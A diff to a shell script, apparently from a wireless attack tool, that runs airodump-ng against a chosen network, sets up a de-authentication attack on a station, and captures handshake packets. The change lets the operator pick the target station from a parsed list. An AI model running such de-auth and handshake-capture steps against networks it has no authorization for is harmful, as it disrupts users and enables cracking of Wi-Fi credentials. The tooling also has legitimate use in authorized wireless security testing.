@@ -120,7 +120,8 @@ main () {
     sudo airodump-ng -d $v_network_ssid -c $v_network_channel ${v_network_adapter}mon -w/tmp/stations
 
     # Run a de-auth attack for the selected device
-    gt_prompt "Please specify the station-id to de-auth" v_network_station_id
+    gt_pause "Please specify the station-id to de-auth. Press RET to select one from the list..."
+    v_network_station_id=$(cat /tmp/stations-01.csv | xargs -0 sbcl --script /opt/gust/parse-stations.lisp | fzf)
     gt_prompt "Please specify a filename to capture packets into. It will be temporarily stored under '/tmp'." v_packets_file
     v_packets_file=/tmp/$v_packets_file
     gt_log "Starting to capture handshake packets on ${v_network_adapter}..."
